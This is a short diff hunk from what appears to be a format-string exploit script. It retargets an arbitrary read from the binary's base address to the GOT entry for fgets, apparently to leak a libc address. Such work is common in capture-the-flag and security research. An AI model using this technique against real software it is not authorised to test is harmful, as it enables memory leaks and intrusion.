@@ -29,5 +29,5 @@ if __name__ == '__main__':
     print(vuln_details)
     exploiter = FmtExploiter(binary, vuln_details)
     # exploiter.apply_fmt1()
-    exploiter.arbitrary_read(binary.elf.address)
+    exploiter.arbitrary_read(binary.elf.got['fgets'])
 
